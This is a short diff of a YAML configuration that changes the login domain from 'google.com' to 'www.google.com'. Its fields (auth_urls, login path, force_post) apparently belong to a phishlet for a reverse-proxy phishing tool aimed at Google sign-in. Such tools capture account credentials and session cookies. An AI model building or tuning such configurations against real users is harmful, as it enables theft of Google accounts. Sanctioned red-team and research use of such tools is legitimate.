@@ -48,7 +48,7 @@ auth_urls:
   - '/mail'
   - '/?ogb#inbox'
 login:
-  domain: 'google.com'
+  domain: 'www.google.com'
   path: '/v3/signin/identifier?dsh=S-1828382813%3A1681252380179106&authuser=0&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession'
 force_post:
   - path: '/v3/signin/identifier?'
